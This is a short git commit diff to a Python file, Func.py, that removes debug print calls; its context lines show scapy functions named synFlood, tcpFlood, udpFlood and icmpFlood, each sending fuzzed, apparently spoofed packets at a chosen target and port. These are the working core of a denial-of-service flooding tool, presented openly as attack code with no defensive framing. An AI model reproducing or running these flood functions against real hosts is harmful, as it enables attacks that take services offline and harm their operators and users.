36fafa14c3e439b5e46580b74e35ba0896c53efe
angellwings <angellwings@gmail.com>
2012-10-23 19:48:55 +0800

    trace message deleted.

--- Func.py
+++ Func.py
@@ -6,25 +6,21 @@ from scapy.all import *
 def synFlood(target, port):
     ip = fuzz(IP(dst=target))
     syn = fuzz(TCP(dport=port, flags='S'))
-    syn.show()
     send(ip/syn, verbose=0)
     
 def tcpFlood(target, port):
     ip = fuzz(IP(dst=target))
     tcp = fuzz(TCP(dport=port))
-    tcp.show()
     send(ip/tcp, verbose=0)
     
 def udpFlood(target, port):
     ip = fuzz(IP(dst=target))
     udp = fuzz(UDP(dport=port))
-    udp.show()
     send(ip/udp, verbose=0)
     
 def icmpFlood(target):
     ip = fuzz(IP(dst=target))
     icmp = fuzz(ICMP())
-    icmp.show()
     send(ip/icmp, verbose=0)
             
 def getIP(domainName):
